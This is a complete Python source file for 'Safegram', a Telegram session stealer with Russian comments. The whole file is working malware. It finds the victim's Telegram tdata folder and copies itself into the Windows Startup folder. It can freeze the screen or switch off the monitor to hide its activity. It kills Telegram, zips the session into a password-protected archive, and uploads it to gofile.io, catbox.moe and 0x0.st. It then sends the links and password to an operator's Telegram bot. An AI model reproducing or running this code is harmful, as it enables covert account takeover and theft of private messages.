from pyzipper import AESZipFile, ZIP_DEFLATED, WZ_AES
from telebot.async_telebot import AsyncTeleBot, types
from concurrent.futures import ThreadPoolExecutor
from psutil import disk_partitions, process_iter
from subprocess import Popen, CREATE_NO_WINDOW
from shutil import rmtree as rm, copyfile
from datetime import datetime, timezone
from urllib.parse import quote_plus
from os import walk, path, remove
from pyautogui import screenshot
from asyncio import gather, run
from socket import gethostname
from tkinter import Tk, Label
from threading import Thread
from ctypes import windll
from requests import post
from pathlib import Path
from PIL import ImageTk
from time import sleep
import sys

from Config import *





class Safegram:



    def __init__(self):
        self.pc_name = gethostname()                                           # Имя ПК
        self.date = datetime.now(timezone.utc).strftime('%Y-%m-%d %H-%M-%S')   # Текущее время по UTC
        self.password = quote_plus(PASSWORD)                                   # Пароль от архива

        self.telegram = ''      # Путь до Telegram
        self.archive = ''       # Путь до архива со Telegram
        self.telegram_exe = ''  # Путь до Telegram.exe

        self.link_gofile = ''   # Ссылка на скачку архива с gofile.io
        self.link_catbox = ''   # Ссылка на скачку архива с catbox.moe
        self.link_0x0 = ''      # Ссылка на скачку архива с 0x0.st

        self.freeze_window = '' # Окно Tkinter



    def search_path(self, device):
        '''Поиск директории Telegram на диске'''

        for path in walk(device): # Запуск цикла, который пробегает по всем каталогам на диске
            if not self.telegram: # Если ещё ничего не нашлось
                if '\\tdata\\' in path[0]:
                    self.telegram = path[0]
                    break
            else:break # Остановка цикла если что-то было обнаружено



    def creating_threads(self):
        '''Запуск поиска директории Telegram в отдельном потоке для каждого накопителя'''

        with ThreadPoolExecutor() as executor:
            devices = [device.device for device in disk_partitions()] # Список накопителей
            executor.map(self.search_path, devices) # Запуск потока для каждого накопителя



    def clear_path(self):
        '''Очистка найденного пути до совершенного вида, то есть {Путь}\\Telegram\\tdata'''

        self.telegram = path.join(path.dirname(self.telegram)) # Получение чистого пути до tdata



    def autorun(self):
        this_file = Path(__file__).resolve() # Абсолютный путь к текущей программы

        try:
            this_file = Path(sys.executable).resolve() if getattr(sys, 'frozen', False) else Path(__file__).resolve()
            target = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup' / this_file.name
            copyfile(this_file, target)
        except:pass



    def process_kill(self):
        '''Поиск и завершение процесса Telegram, для устранения возможных ошибок в дальнейших манипуляциях'''

        try:
            for process in (process for process in process_iter() if process.name().lower()=='telegram.exe'): # Поиск процесса Telegram
                self.telegram_exe = process.exe() # Сохранение путя до Telegram.exe
                process.kill() # завершение процесса Telegram
        except:pass



    def process_up(self):
        '''Запуск процесса Telegram'''

        try:Popen([self.telegram_exe], creationflags=CREATE_NO_WINDOW, close_fds=True)
        except:pass



    def monitor_off(self):
        '''Выключение монитора/мониторов без ухода в сон, или полного выключения'''

        try:windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        except:pass



    def explorer_on(self):
        '''Открытие проводника'''

        try:Popen(r'explorer shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}')
        except:pass



    def freeze_on(self):
        '''Заморозка экрана'''

        def run_freeze():
            self.freeze_window = Tk()
            self.freeze_window.attributes('-fullscreen', True)
            self.freeze_window.attributes('-topmost', True)
            self.freeze_window.overrideredirect(True)
            screen = screenshot()
            screenshot_tk = ImageTk.PhotoImage(screen)
            label = Label(self.freeze_window, image=screenshot_tk)
            label.image = screenshot_tk
            label.pack(fill='both', expand=True)
            self.freeze_window.mainloop()
        Thread(target=run_freeze, daemon=True).start()



    def freeze_off(self):
        '''Разморозка экрана'''

        if self.freeze_window is not None:
            self.freeze_window.after(0, self.freeze_window.destroy)
            self.freeze_window = None



    def clear_cache(self):
        '''Очистка кэша Telegram, дабы иметь минимальный вес для быстрой передачи архива с аккаунтом Telegram'''

        try:
            # Запуск цикла, который пробегает по всем каталогам в папке tdata
            for root, dirs, files in walk(self.telegram):
                if any(path in root for path in ['cache', 'media_cache', 'webview', 'wvbots', 'wvother']):
                    rm(root) # Удаление кеша Telegram
        except:pass



    def archiving(self):
        '''Архивация сессии Telegram в zip архив, а именно всего содержимого с папки {Путь}\\Telegram\\tdata'''

        ARCHIVE_NAME = f'{Path.home()}\\[Endway] [{self.pc_name}] [{self.date}].zip' # Имя архива

        try:
            # Открытие архива
            with AESZipFile(ARCHIVE_NAME, 'w', compression=ZIP_DEFLATED, encryption=WZ_AES, compresslevel=9) as archive:

                # Установка пароля
                if self.password:
                    archive.setpassword(self.password.encode('utf-8'))

                # Запись содержимого папки Telegram в архив
                for root, dirs, files in walk(self.telegram):
                    rel_root = path.relpath(root, start=self.telegram)
                    if not files and not dirs:
                        archive.writestr(rel_root + '/', '')
                    for file in files:
                        full_path = path.join(root, file)
                        arcname = path.join(rel_root, file) if rel_root != '.' else file
                        archive.write(full_path, arcname=arcname)

            # Сохранение путя к архиву
            self.archive = ARCHIVE_NAME
        except:pass



    async def uploading_to_gofile(self):
        '''Загрузка архива на gofile.io и сохранение ссылки на скачку архива'''

        try:self.link_gofile = post('https://store1.gofile.io/uploadFile', files={'file': open(self.archive, 'rb')}).json()['data']['downloadPage']
        except:pass



    async def uploading_to_catbox(self):
        '''Загрузка архива на catbox.moe и сохранение ссылки на скачку архива'''

        try:self.link_catbox = post('https://catbox.moe/user/api.php', data={'reqtype': 'fileupload'}, files={'fileToUpload': open(self.archive, 'rb')}).text
        except:pass



    async def uploading_to_0x0(self):
        '''Загрузка архива на 0x0.st и сохранение ссылки на скачку архива'''

        try:self.link_0x0 = post('https://0x0.st', headers={'User-Agent': 'Safegram/3.0'}, files={'file': open(self.archive, 'rb')}).text
        except:pass



    async def send_url_to_tgbot(self):
        '''Отправка ссылок в боте'''

        buttons = types.InlineKeyboardMarkup(row_width=1)
        if self.link_gofile:
            buttons.add(types.InlineKeyboardButton(text='GoFile.io', url=self.link_gofile))
        if self.link_catbox:
            buttons.add(types.InlineKeyboardButton(text='Catbox.moe', url=self.link_catbox))
        if self.link_0x0:
            buttons.add(types.InlineKeyboardButton(text='0x0.st', url=self.link_0x0))

        password = f'Пароль от архива: <code>{self.password}</code>\n' if self.password else ''
        text = (
            f'<b>Имя компьютера: <code>{self.pc_name}</code>\n'
            f'Время: <code>{self.date} UTC</code>\n'
            f'{password}'
            '\n⚡️ <a href="https://t.me/+cQ7C290iThhu">Mosrlters Club</a></b>'
        )

        try:
            bot = AsyncTeleBot(TOKEN, parse_mode='html')
            await bot.send_message(ADMIN, text, reply_markup=buttons, disable_web_page_preview=True)
        except:pass



    async def run(self):
        '''Запуск поиска, очистки, архивации, загрузки и отправки ссылок на архив с Telegram'''

        self.creating_threads()                  # Поиск директории Telegram

        # Проверка наличие пути до Telegram
        if self.telegram:
            self.clear_path()                    # Очистка директории Telegram

            # Добавление стиллера в автозагрузку (если включено)
            if AUTORUN:
                self.autorun()

            # Включение монитора/мониторов без ухода в сон (если включено)
            if MONITOR_OFF:
                self.monitor_off()

            # Открытие проводника (если включено)
            if EXPLORER_ON:
                self.explorer_on()

            # Заморозка экрана (если включено)
            if FREEZE_ON:
                self.freeze_on()

            self.process_kill()                  # Поиск и завершение процесса Telegram
            self.clear_cache()                   # Поиск и удаление кеша Telegram
            self.archiving()                     # Архивация Telegram
            self.process_up()                    # Поиск и размарозка процесса Telegram

            # Заморозка экрана (если включено)
            if FREEZE_ON:
                sleep(5)
                self.freeze_off()

            gathers = []

            # Загрузка архива на gofile (если включено)
            if UPLOAD_GOFILE:
                gathers.append(self.uploading_to_gofile())

            # Загрузка архива на catbox (если включено)
            if UPLOAD_CATBOX:
                gathers.append(self.uploading_to_catbox())

            # Загрузка архива на 0x0 (если включено)
            if UPLOAD_0X0:
                gathers.append(self.uploading_to_0x0())

            # Параллельная загрузка
            await gather(*gathers)


            # Проверка наличие пути до архива
            if self.archive:
                remove(self.archive)             # Удаление архива

            # Проверка на наличие ссылок
            if any((self.link_gofile, self.link_catbox, self.link_0x0)):
                await self.send_url_to_tgbot()   # Отправка ссылок в боте





async def Safegram_Auto():
    '''Автоматический запуск поиска, очистки, архивации, загрузки и отправки ссылок на архив с Telegram'''

    safegram = Safegram()
    await safegram.run()





if __name__ == '__main__':
    run(Safegram_Auto())


